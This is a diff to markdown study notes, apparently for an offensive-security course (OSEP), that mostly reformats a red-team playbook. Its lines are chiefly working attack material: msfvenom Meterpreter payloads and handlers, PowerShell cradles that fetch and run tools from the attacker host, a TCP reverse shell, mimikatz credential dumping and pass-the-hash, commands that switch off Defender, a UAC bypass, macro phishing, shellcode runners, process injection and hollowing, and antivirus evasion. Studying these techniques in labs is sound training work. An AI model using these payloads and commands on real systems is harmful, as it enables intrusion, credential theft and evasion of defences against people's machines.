@@ -1,35 +1,9 @@
-# Client Side Code Execution With Office
+# Lab
 
 ```bash
-nc -nvlp 444
-```
+msfconsole -qx "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_https;set LHOST 192.168.119.120;set LPORT 53;run;" 
 
-```bash
-msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.120 LPORT=444 -f exe -o shell.exe
-```
-
-## Meterpreter Handler
-
-```bash
-msfconsole -qx "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_https;set LHOST 192.168.119.120;set LPORT 443;run;"
-```
-
-```bash
-msfconsole -qx "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_https;set LHOST 192.168.x.y;set LPORT 53;set AutoRunScript post/windows/manage/migrate;run;"
-```
-
-```bash
-msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.119.120 LPORT=443 -f exe -o msfnonstaged.exe
-
-msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f exe -o msfstaged.exe
-```
-
-# OSEP
-
-```bash
-msfconsole -qx "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_https;set LHOST 192.168.45.153;set LPORT 53;run;" 
-
-msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.153 LPORT=53 EXITFUNC=thread -f csharp -o data.txt
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=53 EXITFUNC=thread -f csharp -o data.txt
 
 python helper.py data.txt > enc.txt
 ```
@@ -39,19 +13,23 @@ python helper.py data.txt > enc.txt
 ```
 
 ```bat
-powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.45.153/hol.exe', 'C:\Users\Public\hol.exe')
+powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/hol.exe', 'C:\Users\Public\hol.exe')
 
-C:\Users\Public\hol.exe 192.168.45.153 enc.txt
+C:\Users\Public\hol.exe 192.168.119.120 enc.txt
 ```
 
 ```pwsh
 [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
 ```
 
+PrintSpoofer
+
 ```pwsh
-iwr -uri http://192.168.45.153/PrintSpoofer64.exe -Outfile C:\Users\Public\PrintSpoofer64.exe
+iwr -uri http://192.168.119.120/PrintSpoofer64.exe -Outfile C:\Users\Public\PrintSpoofer64.exe
 C:\Users\Public\PrintSpoofer64.exe -i -c powershell.exe
 ```
+
+Disable AV
 
 ```pwsh
 Set-MpPreference -DisableRealtimeMonitoring $true
@@ -60,8 +38,11 @@ cmd /c "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
 
 ```pwsh
 $ProgressPreference = "SilentlyContinue"
-iwr -uri http://192.168.45.153/SharpHound.ps1 -Outfile C:\Users\Public\SharpHound.ps1
-Import-Module C:\Users\Public\SharpHound.ps1
+```
+
+```pwsh
+iex((new-object system.net.webclient).downloadstring("http://192.168.119.120/SharpHound.ps1"))
+
 Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\Public\ -OutputPrefix "final"
 ```
 
@@ -70,8 +51,8 @@ impacket-smbserver osep /home/kali/Quick -smb2support -user admin -password Pass
 ```
 
 ```bat
-net use \\192.168.45.153 /user:admin Password1234
-cp final_20241204092914_BloodHound.zip \\192.168.45.153\osep\
+net use \\192.168.119.120 /user:admin Password1234
+cp final_BloodHound.zip \\192.168.119.120\osep\
 ```
 
 Raw query to display
@@ -86,13 +67,14 @@ MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
 ```
 
 ```pwsh
-iwr -uri http://192.168.45.153/mimikatz.exe -Outfile C:\Users\Public\mimikatz.exe
+iwr -uri http://192.168.119.120/mimikatz.exe -Outfile C:\Users\Public\mimikatz.exe
+
 C:\Users\Public\mimikatz.exe
 ```
 
 ```
 privilege::debug
-sekurlsa::logonpasswords
+sekurlsa::logonpasswords full
 ```
 
 `run0.txt`
@@ -104,36 +86,45 @@ $client = New-Object System.Net.Sockets.TCPClient('192.168.119.120',443);$stream
 ```
 
 ```pwsh
-$Text = 'iex((new-object system.net.webclient).downloadstring("http://192.168.45.153/run0.txt"))'                                                               
+$Text = 'iex((new-object system.net.webclient).downloadstring("http://192.168.119.120/run0.txt"))'                                                        
 $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)                    
 $EncodedText = [Convert]::ToBase64String($Bytes)                            
 $EncodedText
 ```
 
+Pass the Hash
+
 ```
 privilege::debug
-sekurlsa::pth /user:Administrator /domain:corp.com /ntlm:2892d26cdf84d7a70e2eb3b9f05c425e /run:"powershell -exec bypass -nop -w hidden -e <base64-encoded command>"
+sekurlsa::pth /user:Administrator /domain:corp.com /ntlm:<hash> /run:"powershell -exec bypass -nop -w hidden -e <base64-encoded command>"
 ```
 
 ```pwsh
-iwr -uri http://192.168.45.153/PowerView.ps1 -Outfile C:\Users\Public\PowerView.ps1
-Import-Module C:\Users\Public\PowerView.ps1
+iex((new-object system.net.webclient).downloadstring("http://192.168.119.120/PowerView.ps1"))
 
 Get-NetComputer | select dnshostname | Resolve-IPAddress
 Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion
-Get-NetUser | select userprincipalname
 
+Get-NetUser | select userprincipalname
+```
+
+Change User Password:
+
+```pwsh
 $UserPassword = ConvertTo-SecureString 'Password1234' -AsPlainText -Force
 Set-DomainUserPassword -Identity 'nina@final.com' -AccountPassword $UserPassword
 ```
+
+Chisel
 
 ```bash
 ./chisel server --port 8181 --reverse
 ```
 
 ```pwsh
-iwr -uri http://192.168.45.153/chisel.exe -Outfile C:\Users\Public\chisel.exe
-C:\Users\Public\chisel.exe client 192.168.45.153:8181 R:socks
+iwr -uri http://192.168.119.120/chisel.exe -Outfile C:\Users\Public\chisel.exe
+
+C:\Users\Public\chisel.exe client 192.168.119.120:8181 R:socks
 
 chisel.exe client 192.168.45.185:8181 R:3306:127.0.0.1:3306
 ```
@@ -142,25 +133,27 @@ chisel.exe client 192.168.45.185:8181 R:3306:127.0.0.1:3306
 proxychains -q xfreerdp /cert-ignore /bpp:8 /compression -themes -wallpaper /auto-reconnect /size:1900x880 /d:final.com /u:nina /p:Password1234 /v:172.16.147.183 /drive:PEN-300,/home/kali/OffSec/PEN-300
 ```
 
-```pwsh
-$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
+PowerUp
 
-iex((new-object system.net.webclient).downloadstring('http://192.168.45.153/PowerUp.ps1'))
+```pwsh
+iex((new-object system.net.webclient).downloadstring('http://192.168.119.120/PowerUp.ps1'))
 
 Invoke-AllChecks
+```
 
+Modify Service 
+
+```pwsh
 sc.exe config SNMPTRAP binpath= "net localgroup Administrators nina /add" obj= "LocalSystem" start= auto
-
 sc.exe qc SNMPTRAP
-
 sc.exe start SNMPTRAP
 ```
 
 ```bash
-ssh -N -R 127.0.0.1:8081:172.16.155.194:8081 kali@192.168.45.x
+ssh -N -R 127.0.0.1:8081:172.16.155.194:8081 kali@192.168.45.123
 ```
 
-Obtain a list of SPNs
+Obtain list of SPNs
 
 ```pwsh
 Get-NetUser -SPN | select samaccountname,serviceprincipalname
@@ -170,28 +163,40 @@ Get-NetUser -SPN | select samaccountname,serviceprincipalname
 systemd-resolve --status | grep "DNS Servers"
 ```
 
+Create new user
+
 ```pwsh
 net user admin Password1234 /add
 net localgroup administrators admin /add
 ```
+
+Enable RDP
 
 ```pwsh
 Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
 Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
 ```
 
+Find files by name
+
 ```bat
 dir /s trojan.txt
 ```
+
+Find files by keyword
 
 ```pwsh
 Get-ChildItem -Recurse | Select-String "password" -List | Select Path
 ```
 
+Send email
+
 ```bash
 proxychains -q smtp-user-enum -M RCPT -U emails.txt -t 172.16.x.y
 proxychains -q sendEmail -f dev@corp.com -t maanger@corp.com -u “Report to Review” -m “Please review this report” -s 172.16.x.y -a Report.doc
 ```
+
+UAC Bypass
 
 ```pwsh
 New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value "powershell -exec bypass -nop -w hidden -e aQBlAHgAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABzAHkAcwB0AGUAbQAuAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4ANAA5AC4ANwA3AC8AcgB1AG4ALgB0AHgAdAAiACkAKQA=" -Force
@@ -272,7 +277,7 @@ HTML5 anchor tag **download** attribute instructs the browser to automatically d
 
 ## Phishing with Microsoft Office
 
-Save our document in a Macro-Enabled format such as `.doc` or `.docm`. The newer `.docx` will not store macros.
+Save our document in a Macro-Enabled format such as `.doc` or `.docm`. (The newer `.docx` will not store macros)
 
 ```VB
 Sub Document_Open()
@@ -303,13 +308,13 @@ Sub Wait(n As Long)
 End Sub
 ```
 
-Create an Excel macro that runs when opening an Excel spreadsheet using **Workbook_Open**.
+Create an Excel macro that runs when opening an Excel spreadsheet using `Workbook_Open`.
 
 ## Phishing PreTexting
 
 1. With the text created, mark it and navigate to `Insert > Quick Parts > AutoTexts` and `Save Selection to AutoText Gallery`
 
-2. In the **Create New Building Block** dialog box, enter the name "TheDoc"
+2. In the **Create New Building Block** dialog box, enter the name `TheDoc`
 
 ```VB
 Sub Document_Open()
@@ -329,13 +334,13 @@ End Sub
 
 ## VBA Shellcode Runner
 
-Use **VirtualAlloc** to allocate unmanaged memory that is writable, readable, and executable.
+Use `VirtualAlloc` to allocate unmanaged memory that is writable, readable, and executable.
 
-Copy the shellcode into the newly allocated memory with **RtlMoveMemory**, and
+Copy the shellcode into the newly allocated memory with `RtlMoveMemory`, and
 
-Create a new execution thread in the process through **CreateThread** to execute the shellcode.
+Create a new execution thread in the process through `CreateThread` to execute the shellcode.
 
-Meterpreter Handler (x86)
+`x86` Meterpreter Handler
 
 ```bash
 msfconsole -qx "use exploit/multi/handler;set payload windows/meterpreter/reverse_https;set LHOST 192.168.119.120;set LPORT 443;run;"
@@ -382,14 +387,15 @@ End Sub
 
 ## Porting Shellcode Runner to PowerShell
 
-Use the .NET **Copy** method from the `System.Runtime.InteropServices.Marshal` namespace to copy data from a managed array to an unmanaged memory pointer.
+Use the .NET `Copy` method from the `System.Runtime.InteropServices.Marshal` namespace to copy data from a managed array to an unmanaged memory pointer.
 
 Previous VBA shellcode runner continued executing because we never terminated its parent process (Word). 
 
-In this version, our shell dies as soon as the parent PowerShell process terminates.
+This time, our shell dies as soon as the parent `PowerShell` process terminates.
 
 => Instruct PowerShell to delay termination until our shell fully executes using the Win32 **WaitSingleObject** API
 
+`x64` Meterpreter Handler
 
 ```bash
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f ps1
@@ -446,21 +452,21 @@ End Sub
 
 ## Reflection Shellcode Runner in PowerShell
 
-2 primary ways to locate functions in unmanaged dynamic link libraries:
+2 ways to locate functions in unmanaged dynamic link libraries:
 
-1. **Add-Type** and **DllImport** keywords (or the Declare keyword in VBA). However, Add-Type calls the csc compiler, which writes to disk.
+1. `Add-Type` and `DllImport` keywords (or the `Declare` keyword in VBA). However, `Add-Type` calls the `csc` compiler, which writes to disk.
 
 2. Dynamic lookup
 
-To perform a dynamic lookup of function addresses, 2 special Win32 APIs:
+To perform a dynamic lookup of function addresses, 2  Win32 APIs:
 
-1. **GetModuleHandle** obtains a handle to the specified DLL, i.e. the memory address of the DLL.
+1. `GetModuleHandle` obtains a handle to the specified DLL, i.e. the memory address of the DLL.
 
-2. Pass the DLL handle and the function name to **GetProcAddress**, which will return the function address.
+2. Pass the DLL handle and the function name to `GetProcAddress`, which will return the function address.
 
-Using **GetType** to obtain a reference to the `System.dll` assembly at runtime => **Reflection** technique.
+Using `GetType` to obtain a reference to the `System.dll` assembly at runtime => **Reflection** technique.
 
-**GetMethod** function to obtain a reference to the internal GetModuleHandle method.
+`GetMethod` function to obtain a reference to the internal `GetModuleHandle` method.
 
 ### run2.txt
 
@@ -523,13 +529,13 @@ $hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPoint
 
 ## PowerShell Proxy-Aware Communication
 
-View the proxy settings
+View the proxy settings:
 
 ```pwsh
 [System.Net.WebRequest]::DefaultWebProxy.GetProxy("http://192.168.119.120/run.ps1")
 ```
 
-Remove proxy settings by simply creating an empty object
+Remove proxy settings:
 
 ```pwsh
 $wc = new-object system.net.WebClient
@@ -541,9 +547,9 @@ In some environments, network communications not going through the proxy will ge
 
 ## Fiddling With The User-Agent
 
-The `Net.WebClient` PowerShell download cradle does not have a default User-Agent set => The session will stand out from other legitimate traffic.
+The `Net.WebClient` PowerShell download cradle does not have a default `User-Agent` set => The session will stand out from other legitimate traffic.
 
-Customize User-Agent
+Customize `User-Agent`:
 
 ```pwsh
 $wc = new-object system.net.WebClient
@@ -553,27 +559,27 @@ $wc.DownloadString("http://192.168.119.120/run.ps1")
 
 ## Give Me A SYSTEM Proxy
 
-SysInternals PsExec SYSTEM integrity 32-bit PowerShell ISE command prompt:
+Launch a SysInternals `PsExec`SYSTEM integrity 32-bit PowerShell ISE command prompt
 
-* -s: run it as SYSTEM
-* -i: make it interactive with the current desktop
+* -s: run it as `SYSTEM`
+* -i: make it interactive with the current desktop.
 
 ```bat
 PsExec.exe -s -i C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell_ise.exe
 ```
 
-A PowerShell download cradle running in **SYSTEM** integrity level context does not have a proxy configuration set and may fail to call back to our C2 infrastructure.
+A PowerShell download cradle running in `SYSTEM` integrity level context does not have a proxy configuration set and may fail to call back to our C2 infrastructure.
 
-=> Create a proxy configuration for the built-in SYSTEM account, i.e., copy a configuration from a standard user account.
+=> Create a proxy configuration for the built-in `SYSTEM` account by copying a configuration from a standard user account.
 
 Proxy settings for each user are stored in the registry at 
 `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\InternetSettings`
 
-When navigating the registry, the **HKEY_CURRENT_USER** registry hive is mapped according to the user trying to access it, but when navigating the registry as SYSTEM, no such registry hive exists.
+When navigating the registry, the `HKEY_CURRENT_USER` registry hive is mapped according to the user trying to access it, but when navigating the registry as `SYSTEM`, no such registry hive exists.
 
-The **HKEY_USERS** registry hive always exists and contains the content of all user **HKEY_CURRENT_USER** registry hives split by their respective **SIDs**. => Map the HKEY_USERS registry hive with **New-PSDrive**
+The `HKEY_USERS` registry hive always exists and contains the content of all user `HKEY_CURRENT_USER` registry hives split by their respective **SIDs**. => Map the `HKEY_USERS` registry hive with `New-PSDrive`
 
-Any SID starting with "**S-1-5-21-**" is a user account exclusive of built-in accounts.
+Any SID starting with `S-1-5-21-` is a user account exclusive of built-in accounts.
 
 ```pwsh
 New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS | Out-Null
@@ -588,11 +594,11 @@ $wc.DownloadString("http://192.168.119.120/run2.ps1")
 
 # Client Side Code Execution With Windows Script Host
 
-The default application for `.js` files is the Windows-Based Script Host
+The default application for `.js` files is the `Windows-Based Script Host`
 
 ## Jscript Meterpreter Dropper
 
-Use the Jscript file format to execute Javascript on Windows targets through the Windows Script Host.
+Use the `Jscript` file format to execute `Javascript` on Windows targets through the Windows Script Host.
 
 ### run.js
 
@@ -619,7 +625,7 @@ if (Object.Status == 200)
 var r = new ActiveXObject("WScript.Shell").Run("met.exe");
 ```
 
-Modify the Jscript code to make it proxy-aware with the **setProxy** method
+Make it proxy-aware with the `setProxy` method
 
 ### run2.js
 
@@ -649,6 +655,8 @@ var r = new ActiveXObject("WScript.Shell").Run("shell.exe");
 
 ## Shellcode Runner in C#
 
+Setup Development Environment
+
 Create a Kali Samba share for our code
 
 ```bash
@@ -658,6 +666,7 @@ sudo nano /etc/samba/smb.conf
 ```
 
 `smb.conf`
+
 ```
 [visualstudio]
  path = /home/kali/data
@@ -717,9 +726,9 @@ namespace ShellcodeRunner
 
 ## Jscript Shellcode Runner (DotNetToJscript)
 
-Open DotNetToJscript in Visual Studio, open `TestClass.cs` under the **ExampleAssembly** project. We'll compile this as a `.dll` assembly.
+Open `DotNetToJscript` in Visual Studio > Open `TestClass.cs` under the `ExampleAssembly` project > Compile this as a `.dll` assembly.
 
-Jscript will eventually execute the content of the **TestClass** method, which is inside the TestClass class.
+`Jscript` will execute the content of the `TestClass` method, which is inside the `TestClass` class.
 
 ```csharp
 using System;
@@ -763,9 +772,9 @@ public class TestClass
 }
 ```
 
-DotNetToJscript converts the assembly into a format that Jscript can execute.
+`DotNetToJscript` converts the assembly into a format that `Jscript` can execute.
 
-Copy `DotNetToJscript.exe` and `NDesk.Options.dll` to the `C:\Tools` folder. Then copy `ExampleAssembly.dll` to C:\Tools.
+Copy `DotNetToJscript.exe` and `NDesk.Options.dll` to the `C:\Tools` folder > Copy `ExampleAssembly.dll` to `C:\Tools`.
 
 ```bat
 DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o runner.js
@@ -773,9 +782,7 @@ DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o runner.js
 
 ## SharpShooter
 
-SharpShooter is "a payload creation framework for the retrieval and execution of arbitrary C# source code".
-
-`https://github.com/mdsecactivebreach/SharpShooter`
+[SharpShooter](https://github.com/mdsecactivebreach/SharpShooter) is "a payload creation framework for the retrieval and execution of arbitrary C# source code".
 
 ```bash
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f raw -o shell.txt
@@ -787,7 +794,7 @@ sharpshooter --payload js --dotnetver 4 --stageless --rawscfile shell.txt --outp
 
 ## Reflective Load
 
-**Class Library (.Net Framework)**: Create a managed DLL when we compile.
+Choose `Class Library (.Net Framework)` to create a managed DLL when we compile
  
 
 ```csharp
@@ -827,7 +834,7 @@ namespace ReflectiveLoad
 }
 ```
 
-Use the **LoadFile** method from the `System.Reflection.Assembly` namespace to dynamically load our pre-compiled C# assembly into the process. 
+Use the `LoadFile` method from the `System.Reflection.Assembly` namespace to dynamically load our pre-compiled C# assembly into the process. 
 
 ```pwsh
 (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/ReflectiveLoad.dll', 'C:\Users\Offsec\ReflectiveLoad.dll')
@@ -840,7 +847,11 @@ $method.Invoke(0, $null)
 
 Executing this PowerShell will download the assembly to disk before loading it.
 
-=> Use the **Load** method, which accepts a Byte array in memory instead of a disk file and the **DownloadData** method of the `Net.WebClient` class to download the DLL as a byte array.
+Instead, use:
+
+- The `Load` method, which accepts a Byte array in memory instead of a disk file
+
+- The `DownloadData` method of the `Net.WebClient` class to download the DLL as a byte array.
 
 ```pwsh
 $data = (New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/ReflectiveLoad.dll')
@@ -851,21 +862,27 @@ $method = $class.GetMethod("runner")
 $method.Invoke(0, $null)
 ```
 
-**IronPython**,  lets a penetration tester combine the power of Python and .NET. **Trinity** is a framework for implementing this post-exploitation.
+`IronPython` combine the power of Python and .NET.
 
-Java-based Java Applets and **Java** JAR files can be used to gain client-side code execution. Java also contains a built-in JavaScript scripting engine called **Nashhorn**.
+`Trinity` is a framework for implementing this post-exploitation.
+
+Java-based Java Applets and Java `JAR` files can be used to gain client-side code execution.
+
+Java also contains a built-in JavaScript scripting engine called `Nashhorn`.
 
 # Process Injection and Migration
 
 ## Process Injection in C#
 
-### VirtualAllocEx and WriteProcessMemory
+Use `OpenProcess` to open a handle to the `Explorer` process.
 
-Use **OpenProcess** to open a handle to the Explorer process. PROCESS_ALL_ACCESS (0x001F0FFF) process right gives us complete access to the process.
+- `PROCESS_ALL_ACCESS` (`0x001F0FFF`) process right gives us complete access to the process.
 
-Use **VirtualAlloc** to allocate memory. Specify the size of the desired allocation, the allocation type, and the memory protections 0x1000, 0x3000 (MEM_COMMIT and MEM_RESERVE) and 0x40 (PAGE_EXECUTE_READWRITE), respectively.
+Use `VirtualAlloc` to allocate memory.
 
-Create a new execution thread inside the remote process with **CreateRemoteThread**.
+- Specify the size of the desired allocation, the allocation type, and the memory protections `0x1000`, `0x3000` (`MEM_COMMIT` and `MEM_RESERVE`) and `0x40` (`PAGE_EXECUTE_READWRITE`), respectively.
+
+Create a new execution thread inside the remote process with `CreateRemoteThread`.
 
 ```csharp
 using System;
@@ -911,9 +928,7 @@ namespace ProcessInjection
 }
 ```
 
-### NtCreateSection, NtMapViewOfSection, NtUnMapViewOfSection, and NtClose in ntdll.dll
-
-The low-level native APIs NtCreateSection, NtMapViewOfSection, NtUnMapViewOfSection, and NtClose in `ntdll.dll` can be used as alternatives to VirtualAllocEx and WriteProcessMemory.
+The native APIs `NtCreateSection`, `NtMapViewOfSection`, `NtUnMapViewOfSection`, and `NtClose` in `ntdll.dll` can be used as alternatives to `VirtualAllocEx` and `WriteProcessMemory`.
 
 ```csharp
 using System;
@@ -1053,19 +1068,21 @@ $hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPoint
 
 ## DLL Injection with C#
 
-When a process needs to use an API from a DLL, it calls the **LoadLibrary** API to load it into virtual memory space.
+When a process needs to use an API from a DLL, it calls the `LoadLibrary` API to load it into virtual memory space.
 
-LoadLibrary can not be invoked on a remote process.
+`LoadLibrary` can **not** be invoked on a remote process.
 
-=> Resolve the address of **LoadLibraryA** inside the remote process and invoke it while supplying the name of the DLL we want to load. If the address of LoadLibraryA is given as the 4th argument to **CreateRemoteThread**, it will be invoked when we call CreateRemoteThread.
+=> Resolve the address of `LoadLibraryA` inside the remote process and invoke it while supplying the name of the DLL we want to load.
+
+If the address of `LoadLibraryA` is given as the 4th argument to `CreateRemoteThread`, it will be invoked when we call `CreateRemoteThread`.
 
 Several restrictions to consider:
 
-1. The DLL must be written in C or C++ and must be unmanaged because we can not load a managed DLL into an unmanaged process.
+1. The DLL must be written in C or C++ and must be **unmanaged** because we can not load a managed DLL into an unmanaged process.
 
-2. DLLs normally contain APIs that are called after the DLL is loaded. To call these APIs, an application have to "resolve" their names to memory addresses through the use of **GetProcAddress**. GetProcAddress cannot resolve an API in a remote process.
+2. DLLs normally contain APIs that are called after the DLL is loaded. To call these APIs, an application have to "resolve" their names to memory addresses through the use of `GetProcAddress`. `GetProcAddress` cannot resolve an API in a remote process.
 
-DllMain function is called on module load.
+`DllMain` function is called on module load.
 
 ```C
 BOOL APIENTRY DllMain( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
@@ -1082,11 +1099,11 @@ BOOL APIENTRY DllMain( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpRese
 }
 ```
 
-The **DLL_PROCESS_ATTACH** reason code is passed to DllMain when the DLL is being loaded into the virtual memory address space as a result of a call to LoadLibrary.
+The `DLL_PROCESS_ATTACH` reason code is passed to `DllMain` when the DLL is being loaded into the virtual memory address space as a result of a call to `LoadLibrary`.
 
-=> Instead of defining our shellcode as a standard API exported by our malicious DLL, put our shellcode within the DLL_PROCESS_ATTACH switch case, where it will be executed when LoadLibrary calls DllMain.
+Instead of defining our shellcode as a standard API exported by our malicious DLL, put our shellcode within the `DLL_PROCESS_ATTACH` switch case, where it will be executed when `LoadLibrary` calls `DllMain`.
 
-Generate a Meterpreter DLL with msfvenom:
+Generate a Meterpreter DLL with `msfvenom`:
 
 ```bash
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f dll -o met.dll
@@ -1150,43 +1167,48 @@ namespace DLLInjection
 
 ## Reflective DLL Injection in PowerShell
 
-Reflective DLL injection parses the relevant fields of the DLL's Portable Executable1 (PE) file format and maps the contents into memory.
+Reflective DLL injection parses the relevant fields of the DLL's Portable Executable (`PE`) file format and maps the contents into memory.
 
-The PowerShell reflective DLL injection script (**Invoke-ReflectivePEInjection**) performs reflection to avoid writing assemblies to disk, after which it parses the desired PE file.
+The PowerShell reflective DLL injection script `Invoke-ReflectivePEInjection` performs reflection to avoid writing assemblies to disk, after which it parses the desired PE file.
 
 It has 2 separate modes:
 
-1. Reflectively load a DLL or EXE into the same process
-2. Load a DLL into a remote process.
+1. Reflectively load a `DLL` or `EXE` into the same process
 
+2. Load a DLL into a remote process.
 
 Inject an unmanaged Meterpreter DLL into a process
 
 ```pwsh
 $bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.45.179/met.dll')
+
 $procid = (Get-Process -Name explorer).Id
+
 # Import-Module C:\Tools\Invoke-ReflectivePEInjection.ps1
 IEX((New-Object System.Net.WebClient).DownloadString('http://192.168.45.179/Invoke-ReflectivePEInjection.ps1'))
+
 Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
 ```
 
 ## Process Hollowing in C#
 
-We are generating network activity from processes that generally do not generate it. => migrate to `svchost.exe`
+We are generating network activity from processes that generally do not generate it => migrate to `svchost.exe`.
 
-All `svchost.exe` processes run by default at **SYSTEM** integrity level, meaning we cannot inject into them from a lower integrity level.
+All `svchost.exe` processes run by default at `SYSTEM` integrity level => We cannot inject into them from a lower integrity level.
 
-Additionally, if we were to launch `svchost.exe` (instead of Notepad) and attempt to inject into it, the process will immediately terminate.
+If we launch `svchost.exe` and attempt to inject into it, the process will immediately terminate.
 
 => Launch a `svchost.exe` process and modify it before it actually starts executing.
 
-Supply the **CREATE_SUSPENDED** flag (0x4) when calling **CreateProcess**, the execution of the thread is halted just before it runs the EXE's first instruction.
+1. Supply the `CREATE_SUSPENDED` flag (`0x4`) when calling `CreateProcess`, the execution of the thread is halted just before it runs the EXE's first instruction.
 
-Locate the EntryPoint of the executable and overwrite its in-memory content with our staged shellcode and let it continue to execute.
+2. Locate the `EntryPoint` of the executable and overwrite its in-memory content with our staged shellcode and let it continue to execute.
 
-To read from a remote process, use the **ReadProcessMemory** API, which is a counterpart to WriteProcessMemory.
+3. To read from a remote process, use the `ReadProcessMemory` API, which is a counterpart to `WriteProcessMemory`.
 
-Use **WriteProcessMemory** to overwrite the original content with our shellcode. Then let the execution of the thread inside the remote process continue.
+4. Use `WriteProcessMemory` to overwrite the original content with our shellcode.
+
+5. Let the execution of the thread inside the remote process continue.
 
 ```csharp
 using System;
@@ -1305,7 +1327,7 @@ namespace ProcessHollowing
 
 # Antivirus Evasion
 
-Zero out the byte at offset 18867 of the executable, and write the modified executable to a new file
+Zero out the byte at offset `18867` of the executable, and write the modified executable to a new file:
 
 ```pwsh
 $bytes  = [System.IO.File]::ReadAllBytes("C:\Tools\met.exe")
@@ -1321,19 +1343,15 @@ List the available encoders
 msfvenom --list encoders
 ```
 
-The `x86/shikata_ga_nai` encoder is a commonly-used polymorphic encoder that produces different output each time it is run => signature evasion. `x64/zutto_dekiru` encoder borrows many techniques from it.
+The `x86/shikata_ga_nai` encoder is a commonly-used polymorphic encoder that produces different output each time it is run => signature evasion.
 
-Antivirus detects the signature of the decoder or of the template executable.
+`x64/zutto_dekiru` encoder borrows many techniques from it.
 
 ```bash
-msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -e x86/shikata_ga_nai -f exe -o met.exe
-
-msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -e x64/zutto_dekiru -f exe -o met64_zutto.exe
-
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.176.134 LPORT=443 -e x64/zutto_dekiru -x /home/kali/notepad.exe -f exe -o met64_notepad.exe
 ```
 
-List the encryption options
+List the encryption options:
 
 ```bash
 msfvenom --list encrypt
@@ -1349,15 +1367,15 @@ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=44
 
 Encrypt the shellcode, and create a custom decryption routine to avoid detection.
 
-Use encryption with **msfvenom** to took advantage of the highly secure and complex aes256 encryption algorithm.
+Use encryption with `msfvenom` to took advantage of the highly secure and complex aes256 encryption algorithm.
 
 ### Use Caesar Cipher
 
-Implementing an aes256 decryption routine is not straightforward => Caesar Cipher.
+Implementing an `aes256` decryption routine is not straightforward => `Caesar Cipher`.
 
-We chose a substitution key of 2, iterated through each byte value in the shellcode, and simply added 2 to its value.
+Choese a substitution key of `2`, iterated through each byte value in the shellcode, and simply added `2` to its value.
 
-Perform a bitwise AND operation with 0xFF to keep the modified value within the 0-255 range (single byte) in case the increased byte value exceeds 0xFF.
+Perform a bitwise AND operation with `0xFF` to keep the modified value within the `0-255` range (single byte) in case the increased byte value exceeds `0xFF`.
 
 ```csharp
 using System;
@@ -1466,7 +1484,7 @@ namespace BypassingAntivirus
 
 #### C Sharp
 
-Use the XOR operation to create a different encryption routine
+Use the `XOR` operation to create a different encryption routine
 
 `helper.exe <Kali IP> <msfvenom-generated csharp shellcode file>`
 
@@ -2181,11 +2199,11 @@ Sub MyMacro()
 End Sub
 ```
 
-The P-code is a compiled version of the VBA textual code for the specific version of Microsoft Office and VBA it was created on.
+The `P-code` is a compiled version of the VBA textual code for the specific version of Microsoft Office and VBA it was created on.
 
-If a Microsoft Word document is opened on a different computer that uses the same version and edition of Microsoft Word, the cached pre-compiled P-code is executed, avoiding the translation of the textual VBA code by the VBA interpreter.
+If a Microsoft Word document is opened on a different computer that uses the **same version and edition of Microsoft Word**, the cached pre-compiled `P-code` is executed, avoiding the translation of the textual VBA code by the VBA interpreter.
 
-Automate the VBA Stomping process with Evil Clippy
+Automate the VBA Stomping process with `EvilClippy`
 
 ```bat
